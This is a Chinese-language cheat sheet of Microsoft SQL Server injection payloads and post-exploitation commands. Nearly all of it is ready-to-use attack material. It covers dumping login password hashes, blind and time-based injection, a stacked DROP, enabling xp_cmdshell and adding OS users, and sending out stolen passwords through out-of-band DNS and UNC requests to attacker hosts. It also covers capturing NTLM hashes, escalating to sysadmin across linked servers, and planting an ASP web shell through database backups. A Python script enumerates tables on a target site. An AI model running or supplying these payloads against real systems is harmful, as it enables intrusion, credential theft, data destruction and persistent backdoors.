  ##### 注释符
  	-- 注释
	/* 注释 */
  ##### 用户
  	SELECT CURRENT_USER
	SELECT user_name();
	SELECT system_user;
	SELECT user;
  ##### 版本
  	SELECT @@version
  ##### 主机名
  	SELECT HOST_NAME()
	SELECT @@hostname;
  ##### 数据库名
  	SELECT DB_NAME()
  ##### 列数据库
  SELECT name FROM master..sysdatabases;
	SELECT DB_NAME(N); — for N = 0, 1, 2, …
	SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; -- Change delimeter value such as ', ' to anything else you want => master, tempdb, model, msdb   (Only works in MSSQL 2017+)
  ##### 列表
  	SELECT name FROM master..sysobjects WHERE xtype = ‘U’; — use xtype = ‘V’ for views
	SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’;
	SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable

	SELECT table_catalog, table_name FROM information_schema.columns
	SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U'; -- Change delimeter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)
  ##### 列字段
  	SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only
	SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable

	SELECT table_catalog, column_name FROM information_schema.columns
  ##### 导出用户和密码
	MSSQL 2000:
	SELECT name, password FROM master..sysxlogins
	SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.)

	MSSQL 2005
	SELECT name, password_hash FROM master.sys.sql_logins
	SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
  ##### 联合查询
	列出数据库
	$ SELECT name FROM master..sysdatabases
	[*] Injection
	[*] msdb
	[*] tempdb

	列出表
	$ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
	[*] Profiles
	[*] Roles
	[*] Users

	列出字段
	$ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
	[*] UserId
	[*] UserName

	导出数据
	$ SELECT  UserId, UserName from Users
  ##### 报错型注入
	整型 : convert(int,@@version)
	整型 : cast((SELECT @@version) as int)

	字符型   : ' + convert(int,@@version) + '
	字符型   : ' + cast((SELECT @@version) as int) + '
  ##### 盲注
	AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -

	AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
	AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- 

	AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90

	SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'

	WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
	SELECT message FROM data WHERE row = 1 and message like 't%'
  ##### 延时型
  	ProductID=1;waitfor delay '0:0:10'--
	ProductID=1);waitfor delay '0:0:10'--
	ProductID=1';waitfor delay '0:0:10'--
	ProductID=1');waitfor delay '0:0:10'--
	ProductID=1));waitfor delay '0:0:10'--

	IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'     comment:   --
  ##### 堆查询
  	ProductID=1; DROP members--
  ##### 读文件
  	需要ADMINISTER BULK OPERATIONS 或 ADMINISTER DATABASE BULK OPERATIONS 权限
	-1 union select null,(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),null,null
  ##### 命令执行
	EXEC xp_cmdshell "net user";
	EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
	EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
	激活xp_cmdshell(sql server 2015中默认禁用状态)
	EXEC sp_configure 'show advanced options',1;
	RECONFIGURE;
	EXEC sp_configure 'xp_cmdshell',1;
	RECONFIGURE;
	交互
	sqsh -S 192.168.1.X -U sa -P superPassword
	python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758
	执行python脚本
	列出正在使用的用户
	EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
	EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
	打开并读取文件
	EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
	多行执行
	EXECUTE sp_execute_external_script @language = N'Python', @script = N'
	import sys
	print(sys.version)
	'
	GO
  ##### OOB
	dnslog
	需要VIEW SERVER STATE 权限
	1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))

	需要 CONTROL SERVER 权限
	1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default)))
	1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))
	
	UNC Path
	MSSQL支持堆查询，创建一个指向我们的 IP 地址的变量，然后使用 xp_dirtree 函数列出我们 SMB 共享中的文件并获取 NTLMv2 哈希
	1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
	xp_dirtree '\\attackerip\file'
	xp_fileexist '\\attackerip\file'
	BACKUP LOG [TESTING] TO DISK = '\\attackerip\file'
	BACKUP DATABASE [TESTING] TO DISK = '\\attackeri\file'
	RESTORE LOG [TESTING] FROM DISK = '\\attackerip\file'
	RESTORE DATABASE [TESTING] FROM DISK = '\\attackerip\file'
	RESTORE HEADERONLY FROM DISK = '\\attackerip\file'
	RESTORE FILELISTONLY FROM DISK = '\\attackerip\file'
	RESTORE LABELONLY FROM DISK = '\\attackerip\file'
	RESTORE REWINDONLY FROM DISK = '\\attackerip\file'
	RESTORE VERIFYONLY FROM DISK = '\\attackerip\file'

	添加DBA
	EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;

	信任链接
	数据库之间的链接甚至可以跨林信任工作
	msf> use exploit/windows/mssql/mssql_linkcrawler
	[msf> set DEPLOY true] 如果要利用获取meterpreter会话的权限，将DEPLOY设置为true

	查找链接
	select * from master..sysservers

	通过链接执行查询
	select * from openquery("dcorp-sql1", 'select * from master..sysservers')
	select version from openquery("linkedserver", 'select @@version as version');

	多条查询
	select version from openquery("link1",'select version from openquery("link2","select @@version as version")')

	执行shell命令
	EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
	select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')

	创建用户给权限
	EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
	EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
  ##### 拿shell
	判断数据库
	;and (select count(*) from sysobjects)>0 mssql
	;and (select count(*) from msysobjects)>0 access
	查库
	?id=1 and (SELECT top 1 Name FROM Master..SysDatabases)>0 --
	?id=1 and (SELECT top 1 Name FROM Master..SysDatabases where name not in ('master'))>0 --
	查表
```python
import requests
import re
table_list = ['']
	def get_sqlserver_table(table_list, table_num):
		for num in range(0,table_num):
			# print("','".join(table_list))
			sql_str = "and (select top 1 name from [xxxx].sys.all_objects where type='U' AND is_ms_shipped=0 and name not in ('{}'))>0".format("','".join(table_list))
			url = "http://www.xxxxx.cn/x.aspx?cid=1' {} AND 'aNmV'='aNmV".format(sql_str)
			r = requests.get(url, headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36'})
			res = re.search(r'\'(.*)\'', r.content.decode('utf-8'),  re.M|re.I)
			table_name = str(res.group(1))
			table_list.append(table_name)
			print("[{}] - TableName: {}".format(str(r.status_code), table_name))
	if __name__ == "__main__":
		get_sqlserver_table(table_list, 16)
```
	判断是否存在xp_cmdshell
	and 1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell')
	执行命令
	;exec master..xp_cmdshell "net user name password /add"—
	查看权限
	and (select IS_SRVROLEMEMBER('sysadmin'))=1--  //sa
	and (select IS_MEMBER('db_owner'))=1--   //  dbo
	and (select IS_MEMBER('public'))=1--  //public
	站库分离获取服务器IP
	;insert into OPENROWSET('SQLOLEDB','uid=sa;pwd=xxx;Network=DBMSSOCN;Address=你的ip,80;', 'select * from dest_table') select * from src_table;--
	LOG备份
	;alter database testdb set RECOVERY FULL --
	;create table cmd (a image) --
	;backup log testdb to disk = 'c:\wwwroot\shell.asp' with init --
	;insert into cmd (a) values ('<%%25Execute(request("chopper"))%%25>')-- 
	;backup log testdb to disk = 'c:\wwwroot\shell.asp' –
	2000差异备份
	;backup database testdb to disk ='c:\wwwroot\bak.bak';--
	;create table [dbo].[testtable] ([cmd] [image]);--
	;insert into testtable (cmd) values(木马hex编码);--
	;backup database testdb to disk='c:\wwwroot\upload\shell.asp' WITH DIFFERENTIAL,FORMAT;--
	2005差异备份
	;alter/**/database/**/[testdb]/**/set/**/recovery/**/full—
	;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/database/**/[testdb]/**/to/**/disk=@d/**/with/**/init--
	;create/**/table/**/[itpro]([a]/**/image)—
	;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/log/**/[testdb]/**/to/**/disk=@d/**/with/**/init--
	;insert/**/into/**/[itpro]([a])/**/values(木马hex编码)—
	;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=木马保存路径的SQL_EN编码/**/backup/**/log/**/[testdb]/**/to/**/disk=@d/**/with/**/init--
	;drop/**/table/**/[itpro]—
	;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/log/**/[testdb]/**/to/**/disk=@d/**/with/**/init--